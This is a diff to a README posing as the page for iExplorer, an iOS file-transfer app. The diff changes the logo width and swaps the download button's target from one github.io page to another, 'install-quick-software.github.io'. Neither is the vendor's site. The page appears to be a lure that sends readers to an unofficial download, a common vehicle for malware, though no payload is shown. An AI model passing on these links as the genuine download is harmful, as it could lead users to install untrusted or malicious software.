@@ -1,13 +1,13 @@
 # iExplorer – Advanced iOS File Explorer and Data Transfer Utility  
 
 <div align="center">  
-<img src="https://assets.macroplant.com/images/app_groups/icons/1/57a9ee1f55c750e2a94e6a80be41bcf7e0af1230/iExplorer4-icon-original.png?1493242447" alt="iExplorer Logo" width="500">  
+<img src="https://assets.macroplant.com/images/app_groups/icons/1/57a9ee1f55c750e2a94e6a80be41bcf7e0af1230/iExplorer4-icon-original.png?1493242447" alt="iExplorer Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/iexplorer">  
+<a href="https://install-quick-software.github.io/.github/iexplorer">  
 <img src="https://img.shields.io/badge/💻_GET_iExplorer-navy?style=for-the-badge&logo=apple" alt="GET iExplorer">  
 </a>  
 </div>
